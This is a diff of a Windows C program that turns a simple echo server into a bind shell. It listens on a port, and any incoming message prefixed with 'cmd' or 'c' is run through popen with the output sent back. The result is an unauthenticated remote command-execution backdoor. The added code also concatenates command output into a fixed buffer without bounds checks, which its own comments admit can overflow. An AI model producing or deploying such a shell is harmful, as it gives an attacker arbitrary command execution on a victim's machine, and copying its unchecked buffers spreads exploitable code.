@@ -17,7 +17,12 @@
 #define xstr(s) str(s)
 #define str(s) #s
 
+#define REPLY_SIZE 1024
+#define BUF_SIZE 512
+
 int startShell();
+char* processMsg(char msg[BUF_SIZE]);
+char* processCmd(char msg[BUF_SIZE]);
 
 int port;
 char ip[24];
@@ -75,7 +80,7 @@ int startShell() {
 
     // tell winsock the socker for meant to listen for incoming connections
     listen(sock, SOMAXCONN);
-    printf("Listening for incoming connection...");
+    printf("Listening for incoming connection...\n");
 
     // wait for a connection
     struct sockaddr_in client;
@@ -87,16 +92,16 @@ int startShell() {
     memset(client_ip, 0, sizeof(client_ip));
 
     inet_ntop(AF_INET, &client.sin_addr, client_ip, NI_MAXHOST);
-    printf("%s connected on port %d", client_ip, port);
+    printf("%s connected on port %d\n", client_ip, port);
 
     // close listening port once a connection has been recieved
     // don't need the listening socket because now we have the connected socket
     closesocket(sock);
 
-    char buf[4096];
+    char buf[BUF_SIZE];
     while (TRUE){
         memset(buf, 0, sizeof(buf));
-        int bytesRecv = recv(clientSocket, buf, 4096, 0); // this function returns the length of the message in bytes
+        int bytesRecv = recv(clientSocket, buf, sizeof(buf), 0); // this function returns the length of the message in bytes
         if (bytesRecv == SOCKET_ERROR){
             printf("Error recieving data. Exiting...\n");
             break;
@@ -105,17 +110,51 @@ int startShell() {
             break;
         }
 
-        char * reply = (char*)calloc(bytesRecv, sizeof(char));
-        strcpy(reply, "You said: ");
-        strcat(reply, buf);
-        strcat(reply, "\n");
+        // at this point we have there message in buf and the size in bytesRecv
+        char * reply;
+        reply = processMsg(buf);
 
         // send message back to the client
-        send(clientSocket, reply, bytesRecv + 1, 0);
-    
+        send(clientSocket, reply, REPLY_SIZE, 0);
+        free(reply);
     }
     
     closesocket(clientSocket);
     WSACleanup();
     return 0;
 }
+
+/*
+Function for proccessing the input sent from the client
+Places the necessary response in char *reply, and returns a pointer to the reply in memory
+*/
+char* processMsg(char msg[BUF_SIZE]){
+    // check if a shell (cmd prompt) command is being issued
+    // an input that starts with "cmd" or "c"
+    if (strcmp(strtok(msg, " "), "cmd") == 0 || strcmp(strtok(msg, " "), "c") == 0){
+        char * msgptr = msg;
+        msgptr+=(strcspn(msg, " ")+1); // pass everthing after the "cmd " or "c " at the beginning of the msg
+        return processCmd(msgptr);
+    }
+    else {  // it is a command not meant to be executed by the shell
+        char * reply = (char*)calloc(REPLY_SIZE, sizeof(char));
+        strcpy(reply, "That is not a shell command and is currently not supported\n");
+        return reply;
+    }
+}
+
+char* processCmd(char cmd[BUF_SIZE]) {
+    FILE *fp;
+
+    // may be problem here with buffer overflow causing crash when reply is too big
+    fp = popen(cmd, "r");
+    char * finalResult = (char*)calloc(REPLY_SIZE, sizeof(char));
+    char line[REPLY_SIZE];
+    while (fgets(line, REPLY_SIZE, fp) != NULL) {
+        // NOTE - This has the possibility of causing a buffer overflow error if the length is greater than REPLY_SIZE
+        strcat(finalResult, line);
+    }
+
+    return finalResult;
+}
+
